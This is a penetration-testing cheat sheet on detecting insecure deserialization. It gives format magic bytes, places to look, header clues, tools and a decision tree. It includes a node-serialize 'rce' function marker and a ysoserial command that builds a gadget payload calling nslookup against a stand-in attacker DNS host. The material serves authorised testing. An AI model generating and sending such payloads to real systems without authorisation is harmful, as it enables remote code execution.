# Deserialization Detection

## Identifying Serialization Formats

### PHP Serialized Data
```
O:4:"User":2:{s:4:"name";s:5:"admin";}
a:2:{i:0;s:1:"a";i:1;s:1:"b";}
Pattern: [OoAas]:\d+:
```

### Java Serialized Data
```
Base64 starts with: rO0AB
Raw hex starts with: ac ed 00 05
Content-Type often: application/x-java-serialized-object
```

### .NET Serialized Data (BinaryFormatter)
```
Base64 often contains: AAEAAAD/////
Raw hex starts with: 00 01 00 00 00 FF FF FF FF
ViewState (ASP.NET): starts with /wEP or /wEPDwU
```

### Python Pickle
```
Base64 starts with: gAN (protocol 3), gAR (protocol 4)
Raw hex starts with: 80 03 or 80 04
Opcodes visible if raw: \x80\x03c...
```

### Ruby Marshal
```
Raw starts with: \x04\x08
```

### Node.js (node-serialize)
```
JSON-like with function markers:
{"rce":"_$$ND_FUNC$$_function(){...}()"}
```

## Where to Look for Serialized Data
```
- Cookies (session tokens, "remember me" tokens)
- Hidden form fields
- API request/response bodies
- Cache files
- Message queues (if accessible)
- File uploads (.ser, .bin files)
- URL parameters (less common but possible)
```

## HTTP Header Indicators
```
Content-Type: application/x-java-serialized-object
Content-Type: application/octet-stream (generic, check body)
X-Java-Serialized-Object header
```

## Testing for Deserialization Vulnerability

### Passive Detection
```bash
# Look for the format markers above in captured traffic
# Decode base64 cookies/params and check for magic bytes
echo "COOKIE_VALUE" | base64 -d | xxd | head
```

### Active Detection (Java - trigger error)
```bash
# Send malformed serialized object, look for deserialization-specific stack traces
# java.io.InvalidClassException, ClassNotFoundException in error response
```

### Active Detection (using known gadget probe, side-channel)
```bash
# Use ysoserial with a "detection" gadget that causes DNS lookup or time delay
java -jar ysoserial.jar CommonsCollections1 'nslookup attacker-dns-log.com' | base64
# Send as payload, monitor DNS log for callback
```

## Tools for Analysis
```
ysoserial          # Java gadget chain generator
ysoserial.net      # .NET gadget chain generator
phpggc             # PHP gadget chain generator
freddy (Burp ext)  # Detect deserialization endpoints
Java Deserialization Scanner (Burp ext)
GadgetProbe        # Blind Java deserialization gadget/library fingerprinting
```

## Quick Decision Tree
```
1. Found base64/binary blob in cookie/param?
   → Decode and check magic bytes against format table above
2. Identified format?
   → Go to format-specific reference (php-deser.md, java-deser.md, python-deser.md, dotnet-deser.md, ruby-deser.md)
3. Can't identify format?
   → Check Content-Type header, framework fingerprint (web-recon), error messages
```
